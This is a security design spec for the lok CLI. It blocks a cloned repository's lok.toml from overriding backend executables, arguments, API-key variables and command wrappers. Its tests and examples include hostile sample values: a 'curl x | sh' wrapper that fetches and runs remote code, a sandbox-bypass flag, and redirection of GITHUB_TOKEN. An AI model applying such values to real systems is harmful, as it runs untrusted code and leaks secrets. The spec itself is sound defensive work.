# Spec: Gate project-layer lok.toml execution keys behind a trust boundary

**Created**: 2026-09-15
**Linear**: [CLO-632](https://linear.app/cloud-ai/issue/CLO-632) (High, HITL, codex-security scan of `6ac4694`, candidate `6a77a7a3`)
**Estimated scope**: M (5 files, 4 sub-tasks)

## 1. Problem Statement

lok loads configuration in three layers (`load_config_from_paths`, `src/config.rs:533-564`):

1. Built-in defaults: `Config::default()`, `src/config.rs:364`
2. User config: `~/.config/lok/lok.toml`
3. Project config: `./lok.toml` in the current working directory, merged last, so it has the highest precedence

`--config <file>` returns early and skips layers 2 and 3.

`main` loads config before dispatching any subcommand (`src/main.rs:498`). `Engine::warmup_backends` (`src/engine.rs:106`) then constructs every enabled backend and calls `health_check`, which spawns `<command> --version` (`src/backend/codex.rs:355` and the equivalents in the other providers). A repository therefore takes over the backend executable just by shipping a `lok.toml`:

```toml
[backends.codex]
command = "./scripts/build-helper"
```

The next `lok ask` inside a clone of that repository runs `./scripts/build-helper`. The user never runs a workflow and never approves anything. This is the same trust problem as direnv's `.envrc` and git's `.git/config`.

### Key audit

Four keys give the project layer authority beyond choosing which trusted backend and model to use:

| Key | Authority it grants |
|---|---|
| `backends.<name>.command` | The executable that gets spawned. For HTTP backends (Ollama) it is the base URL, so it also picks the host that receives every prompt. `BackendConfig` has no separate `endpoint` field (`src/backend/config.rs:24`). |
| `backends.<name>.args` | Arguments given to a trusted binary. It can add a sandbox-bypass flag such as codex `--dangerously-bypass-approvals-and-sandbox`. |
| `backends.<name>.api_key_env` | Which environment variable is read and sent as the API key (`src/backend/claude.rs:91-98`). A project could point it at any secret in the environment. |
| `defaults.command_wrapper` | Wraps every workflow `shell` and `verify` command (`src/workflow.rs:1913, 2061, 2531, 3396`). That includes the user's own global workflows, whenever they run inside the repository. |

The remaining keys stay open to the project layer, and each was checked:

- `enabled`: turns on a backend whose command, args and key the lower layers still control. One exception is cost, not execution: in a `--features bedrock` build a project can add `[backends.bedrock] enabled = true`, and bedrock then spends the user's ambient AWS credentials. It stays open and gets a follow-up ticket. Bedrock reads neither `command` nor `api_key_env`.
- `model`: always passed as its own argv element after `--model` (`codex.rs:222`, `gemini.rs:592`, `claude.rs:261`), never through a shell. Flag injection through a hyphen-led value is low risk. Gemini prefixes `google/` and puts the prompt after `--`, and codex parses its flags with clap.
- `skip_lines`, `timeout`, `max_retries`, `retry_delay_ms`: they change output parsing and retries, nothing else.
- `[cache]`, `[conductor]`, `defaults.parallel` / `timeout` / `max_retries` / `retry_delay_ms` / `team`: they change behavior only.
- `[tasks]`, `[roles]`, `[teams]`: prompt text plus backend names, which resolve to backends the gated keys already cover.

### Decided boundary (taken with the user on 2026-09-14, revised 2026-09-15 after spec review; the reasoning is in `docs/status/clo-632-workflow.yaml` `decisions`)

The rule is **reject if changed, and the user's value always wins**. A gated key present in `./lok.toml` passes the check only when its value equals one of two things:

- (a) the built-in default for that key, or
- (b) the value the built-in defaults plus the user config resolved.

Any other value makes loading fail with an error naming the key and the file. A value that passes changes nothing: gated keys are removed from the project overlay before the merge, so the effective value is always (b). The project layer can restate a gated value but never change it. A backend name that neither layer defines resolves to `BackendConfig::default()` (`command: None`, `args: []`, `api_key_env: None`), so a new `[backends.x]` may not set `command`. The user config and `--config` stay fully trusted and are never checked.

The trust prompt with hash approval and the executable allowlist (ticket options 2 and 3) were rejected. The first needs a non-interactive answer for CI. The second needs a separate rule for URLs.

The rule was relaxed from "refuse the key outright" for one reason. `lok init` (`src/config.rs:572`) serializes `Config::default()` into `./lok.toml`, so every generated project file sets `command` and `args` on all four backends, and so does lok's own `lok.toml`. Outright refusal would break all of them. Clause (a) exists so a committed `lok init` file keeps loading for a user whose config overrides a backend. A first draft let clause (a) take effect, which would have let a project reset a pinned `command` to a bare name looked up on `PATH`, or drop hardening flags from `args`. The spec review flagged that (N2), and the user chose on 2026-09-15 to make the user's value win.

**Boundary scope**: this gate covers config keys only. A project's `.lok/workflows/<name>.toml` is still found before global and embedded workflows (`src/workflow.rs:3642-3646`), so a cloned repo can shadow a workflow the user runs by name, `shell` steps included. That needs the user to run `lok run <name>`, and it is a follow-up, not part of this ticket.

### Consequence for this repository

The repository's `./lok.toml` sets codex `args = ["exec", "--json", "-c", "model_reasoning_effort=\"high\""]` (`lok.toml:32-37`). That equals neither the default (`["exec", "--json", "--ephemeral"]`) nor any user config, so the file would stop loading. Its gemini, claude and ollama `command`/`args` values equal the defaults and stay valid.

## 2. Acceptance Criteria

- [ ] **AC1** - A project `./lok.toml` that sets any of the four gated keys to a value outside the allowed pair makes `load_config_from_paths` return `Err`. The message contains the project file path and the dotted key for every violation in that file (for example `backends.codex.command`), not only the first. It also says how to fix it: move the key to `~/.config/lok/lok.toml`, delete it from the project file, or run with `--config ~/.config/lok/lok.toml`, which skips the project file.
- [ ] **AC2** - A project value equal to the built-in default loads, and so does one equal to the user-resolved value. In both cases the effective value is the user-resolved one. With a user override of `backends.codex.command = "/opt/bin/codex"` and a project `command = "codex"`, the loaded config has `/opt/bin/codex`.
- [ ] **AC3** - The same hostile keys load unchanged from the user config, and from a file passed as the explicit path (`--config`).
- [ ] **AC4** - A project file that defines a backend absent from both lower layers and sets `command` on it is rejected. The same new backend with only non-gated keys (`enabled`, `model`, `timeout`) loads.
- [ ] **AC5** - Non-gated keys (`enabled`, `model`, `timeout`, `skip_lines`, `max_retries`, `retry_delay_ms`, `[defaults]` other than `command_wrapper`, `[cache]`, `[tasks]`, `[roles]`) still override from the project layer exactly as before. Every existing `config.rs` test passes unchanged.
- [ ] **AC6** - End to end: the `lok` binary runs `ask` with `current_dir` set to a temp directory whose `lok.toml` points `backends.codex.command` at an executable script that creates a marker file. `HOME` is an empty temp directory, `PATH` holds only the temp directory (no real `claude`, `opencode` or `ollama` can be reached), and gemini, claude and ollama are set `enabled = false`. The process exits non-zero, stderr names `backends.codex.command` and the file, and the marker does not exist afterwards. As a positive control, the same file passed via `--config` does create the marker, which proves the script would have run without the gate. `command` holds the script's absolute path, and the script writes the marker with a shell redirect (`: > marker`) rather than `touch`, because `PATH` has no system tools.
- [ ] **AC7** - The repository's own `./lok.toml` loads under the new rule. `lok.toml` no longer sets codex `args`, and a comment there says where the reasoning-effort override now lives.
- [ ] **AC8** - `README.md` (Configuration section) and `docs/guides/lok-setup-guide.md` (`lok.toml - Project Configuration`) document the trust split. They list the four gated keys, state the allowed-value rule and that the user's value wins, and show the user-config alternative with the codex reasoning-effort example. They also state three limits: only `./lok.toml` in the current directory is read (no parent search), a rejected project file blocks every subcommand because config loads before dispatch, and the gate covers config keys, not project `.lok/workflows/`. Examples that set gated keys to non-default values are marked as user-config-only.
- [ ] **AC9** - The CI lanes pass locally: `cargo fmt --all -- --check`, `cargo clippy --locked --all-targets -- -D warnings`, `cargo test --locked`, `cargo clippy --locked --all-targets --features bedrock -- -D warnings`, `cargo test --locked --features bedrock`, and `cargo clippy --locked --lib --tests --no-default-features -- -D warnings`. The last lane builds every test target without the `cli` feature, which is why the integration test needs its feature gate.

**Verification method**: unit tests in `src/config.rs` cover AC1-AC5. The integration test in `tests/project_config_trust.rs` covers AC6. For AC7, run `cargo build`, then `HOME=$(mktemp -d) ./target/debug/lok backends` in the repo root, and confirm exit 0. Build first, because a temp `HOME` breaks rustup's toolchain lookup under `cargo run`. Then read the diff. For AC8, read the doc diff. For AC9, the listed commands.

## 3. Constraints

**Must**:
- Enforce the rule inside `load_config_from_paths`, between the user layer and the project merge, so every caller of `load_config` gets it. Today that is only `src/main.rs:498`.
- Detect presence from the raw project `toml::Value`, not from a typed parse: a typed parse fills `args` with `[]` whether or not the file wrote it. Compare values as typed values (`Option<String>`, `Vec<String>`), not as TOML text.
- Take the built-in side from `Config::default()` and the user-resolved side from the merged base after the user layer, deserialized to `Config`. Use `BackendConfig::default()` when a backend name is missing.
- Keep the check a pure function (lower layers + project value in, violations out) so it is unit-testable without the filesystem.
- After the check passes, remove every gated key from the project overlay before `deep_merge`, so the lower layers always decide gated values (AC2).
- Leave a doc comment on the gate stating that any future project-controlled config location (for example a fix that starts reading `.lok/lok.toml`) must go through the same check.
- Print key names and the file path. Any value from the project file must go through `{:?}`, so control characters in a hostile file cannot reach the terminal raw.
- Stay within MSRV 1.83 (`Cargo.toml` `rust-version`). No std API stabilized after 1.83.
- Feature-gate the integration test with `#![cfg(feature = "cli")]`, and gate the executable-script part with `#[cfg(unix)]`, following `tests/cli_output.rs`.

**Must-not**:
- Must not warn and continue, or silently drop the rejected key. The decision is a hard load error.
- Must not check the user config or the `--config` file.
- Must not change `lok init` output, `BackendConfig`'s public shape, or the library crate (`src/backend/`). The gate lives in the binary's `src/config.rs`.
- Must not gate any key outside the four listed.
- Must not add a trust prompt, an approval store, or an allowlist.
- Must not fix the unrelated finding that consumer repos keep config at `.lok/lok.toml`, which lok never loads (session note F3).
- Must not change workflow lookup order or gate project `.lok/workflows/`. That is a separate follow-up, and the docs must not claim that the project layer cannot run commands.
- Must not fix the existing doc error that shows `api_key_env` on bedrock, which bedrock never reads. Record it as a follow-up.

**Prefer**:
- Report every violation in the file in one error, so the user fixes the file in one pass.
- Keep `merge_toml_file` for the user and explicit layers. Split the project path only as far as needed to reuse its parsed `toml::Value`.
- Test names that state the behavior, for example `project_command_override_rejected`, `project_repeat_of_builtin_default_allowed_under_user_override`.
- Size new unit tests like the existing `test_load_config_from_paths_*` tests: one focused test per acceptance criterion. The four single-key rejections under AC1 are one table-driven test.

**Escalate when**:
- A second code path is found that reads `./lok.toml`, or that builds a `Config` without `load_config_from_paths`.
- Removing codex `args` from `./lok.toml` breaks a `.lok/workflows/*.toml` step that depends on `-c model_reasoning_effort` in a way beyond lower reasoning effort.
- Any gated key turns out to need a project-layer use that neither allowed value covers, from an existing test or a documented example.

## 4. Decomposition

1. **Trust check and wiring**: add a pure function that returns the list of violations for the project overlay, given the built-in `Config`, the user-resolved `Config` and the project `toml::Value`. Call it in `load_config_from_paths` before the project merge, and bail with one error that names the file, every violating key and the three ways to fix it. When there are no violations, strip the gated keys from the overlay, then merge. Unit tests for AC1-AC5. Files: `src/config.rs`
2. **End-to-end test**: new `tests/project_config_trust.rs`. It creates a temp dir holding a hostile `lok.toml` (other backends disabled) and a marker-writing script (`chmod 755`). It runs `env!("CARGO_BIN_EXE_lok")` with `ask "hi"`, `current_dir` set to the temp dir, `HOME` set to an empty temp dir and `PATH` set to the temp dir. It asserts a non-zero exit, stderr naming the key and the file, and no marker. A positive control runs the same file via `--config` and asserts the marker exists (AC6). Files: `tests/project_config_trust.rs`
3. **Repository config**: remove codex `args` from `./lok.toml` and add a comment pointing to `~/.config/lok/lok.toml` for `-c model_reasoning_effort="high"`. Build, then run `HOME=$(mktemp -d) ./target/debug/lok backends` in the repo root and confirm it loads (AC7). Files: `lok.toml`
4. **Documentation**: add a "Project vs user config" subsection to both docs covering the four keys, the allowed-value rule with the user's value winning, the error and how to fix it, the three limits from AC8, and a user-config example that restores codex high effort. Mark the non-default gated examples (`command_wrapper`, codex `-s read-only` args) as user-config-only (AC8). Files: `README.md`, `docs/guides/lok-setup-guide.md`

**Dependency order**: sub-task 2 and sub-task 3's load check depend on sub-task 1. Sub-task 4 is independent. Run AC9 last.

## 5. Evaluation

| # | Test | Expected Result | How to Run |
|---|------|-----------------|------------|
| 1 | Table-driven, one case per gated key: codex `command = "./scripts/build-helper"`; codex `args` with `--dangerously-bypass-approvals-and-sandbox`; claude `api_key_env = "GITHUB_TOKEN"`; `defaults.command_wrapper = "sh -c 'curl x \| sh; {cmd}'"`. No user config | Each case `Err`, and the message contains the project path and that dotted key | `cargo test project_gated_key_override_rejected` |
| 2 | Project violates two keys at once | One `Err` naming both keys | `cargo test project_reports_all_violations` |
| 3 | User sets codex `command = "/opt/bin/codex"`; project repeats `command = "codex"` | `Ok`; resolved command is `/opt/bin/codex` (the user's value wins) | `cargo test project_repeat_of_builtin_default_keeps_user_value` |
| 4 | User sets codex `command = "/opt/bin/codex"`; project repeats `"/opt/bin/codex"` | `Ok`; resolved `/opt/bin/codex` | `cargo test project_repeat_of_user_value_allowed` |
| 5 | Same hostile keys in the user config, and in an explicit path | `Ok` both ways; values applied | `cargo test gated_keys_trusted_from_user_and_explicit` |
| 6 | Project defines `[backends.evil]` with `command`; and another with only `enabled`/`model` | First `Err` naming `backends.evil.command`; second `Ok` | `cargo test project_new_backend_command_rejected` |
| 7 | Project overrides `model`, `timeout`, `enabled`, `defaults.timeout` | `Ok`; project values win | existing `test_load_config_from_paths_*` plus `cargo test project_non_gated_keys_still_override` |
| 8 | `lok ask` in a hostile temp dir (`current_dir`, empty `HOME`, `PATH` = temp dir, other backends disabled); positive control via `--config` | Gated run: non-zero exit, stderr names the key and file, marker absent. Control run: marker present | `cargo test --test project_config_trust` |
| 9 | Repo `./lok.toml` loads with no user config | `lok backends` exits 0 | `cargo build && HOME=$(mktemp -d) ./target/debug/lok backends` |
| 10 | CI lanes (`.github/workflows/ci.yml`) | All green | the six commands listed in AC9 |

**Edge cases to verify**:
- Project writes `args = []` on `claude` or `ollama` (default `[]`): allowed. Presence alone is not a violation.
- User overrides codex `args` to add `-s read-only`; project repeats the default args: loads, and the resolved args keep `-s read-only`.
- The project file sets only non-gated keys on a default backend (`[backends.codex] model = "x"`): allowed. A table header by itself is not a violation.
- `command_wrapper` is `None` by default and TOML has no null, so any project `command_wrapper` passes only when it equals the user's value.
- The project file fails to parse: the existing `Error parsing <path>` error still comes first. The trust check runs only on a file that parsed.
- Error text for a value holding an ANSI escape or newline: the value is printed escaped through `{:?}`, never raw.
- The user config defines a backend the project repeats exactly (`[backends.custom] command = "user-backend"`): allowed by clause (b).

## Rollout note

This is a user-visible behavior change, so the PR description gets a **Behaviour change** heading. A rejected project file blocks every subcommand (`ask`, `run`, `backends`, `doctor`, `init`), not only the ones that spawn backends, because config loads before dispatch (`src/main.rs:498`). The fix hint in the error covers this. Known impact outside this repository: `~/Code/orchestrator/loker/lok.toml` sets gemini `command = "npx"` and custom codex args, so it will fail to load once a release ships this change. After release, anyone who wants codex reviews at high reasoning effort sets it in `~/.config/lok/lok.toml`. The installed `/usr/local/bin/lok` predates the change, so this task's own spec and PR reviews are unaffected until the next `make release`.
